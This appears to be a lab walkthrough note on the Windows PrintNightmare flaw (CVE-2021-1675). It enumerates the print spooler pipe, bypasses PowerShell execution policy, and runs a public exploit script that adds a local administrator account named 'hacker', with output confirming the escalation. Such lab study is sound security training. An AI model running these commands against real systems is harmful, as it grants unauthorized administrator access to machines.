# PrintNightmare

## Enumeration

```pwsh
PS C:\Users\htb-student> Get-ChildItem \\localhost\pipe\spoolss
```

```output title="Output"
    Directory: \\localhost\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
                                                 spoolss
```

## [CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1)

```pwsh
PS C:\Users\htb-student> Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
PS C:\Users\htb-student> Import-Module C:\Tools\CVE-2021-1675.ps1
PS C:\Users\htb-student> Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd" -DriverName "Hello"
```

```output title="Output" hl_lines="3"
[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```

## Checking Attack Results

```pwsh
PS C:\Users\htb-student> net localgroup Administrators
```

```output title="Output" hl_lines="8"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
hacker
mrb3n
The command completed successfully.
```
